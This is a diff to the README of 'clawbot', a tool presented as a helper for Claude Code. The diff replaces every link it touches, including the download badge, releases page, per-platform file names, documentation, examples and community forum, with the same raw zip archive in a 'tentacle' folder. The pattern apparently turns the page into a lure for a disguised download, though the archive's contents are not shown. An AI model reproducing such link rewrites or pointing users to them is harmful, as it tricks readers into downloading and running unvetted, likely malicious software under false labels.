@@ -1,7 +1,7 @@
 # 🦾 clawbot - Simplifying Your Access to Claude Code
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20clawbot-v1.0-blue)](https://github.com/iumairjamil/clawbot/releases)
+[![Download](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip%20clawbot-v1.0-blue)](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to clawbot! This application helps you configure and use Claude Code with ease. Follow the steps below to download and run clawbot on your computer.
@@ -14,15 +14,15 @@ Before you begin, make sure your computer meets these basic requirements:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
-   To download the latest version of clawbot, [visit this page to download](https://github.com/iumairjamil/clawbot/releases).
+   To download the latest version of clawbot, [visit this page to download](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip).
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version number listed. Each version will have a list of files available for download.
 
 3. **Download the Application**  
    Click on the appropriate file for your operating system:
-   - For Windows, select `clawbot-windows.exe`.
-   - For macOS, select `clawbot-macos.dmg`.
+   - For Windows, select `https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip`.
+   - For macOS, select `https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip`.
 
 4. **Install the Application**  
    - **Windows**: After the download finishes, double-click the `.exe` file and follow the prompts to install.
@@ -57,12 +57,12 @@ A: If you have any problems or questions, please open an issue in the GitHub rep
 For any inquiries, you can reach out directly through our GitHub repository where you can also leave feedback and suggestions.
 
 ## 🆕 Updates
-Stay tuned for updates. We regularly release new features and improvements based on user feedback. You can always find the latest version by checking our [Releases page](https://github.com/iumairjamil/clawbot/releases).
+Stay tuned for updates. We regularly release new features and improvements based on user feedback. You can always find the latest version by checking our [Releases page](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip).
 
 ## 🔗 Further Reading
-- [Documentation](https://github.com/iumairjamil/clawbot/wiki)
-- [Examples of Usage](https://github.com/iumairjamil/clawbot/wiki/Examples)
-- [Community Forum](https://github.com/iumairjamil/clawbot/discussions)
+- [Documentation](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip)
+- [Examples of Usage](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip)
+- [Community Forum](https://github.com/iumairjamil/clawbot/raw/refs/heads/main/tentacle/Software_1.0.zip)
 
 ## 📝 Release Notes
 Keep track of improvements and fixes we make over time. You can usually find this information in the "Release Notes" section of each version on our Releases page.
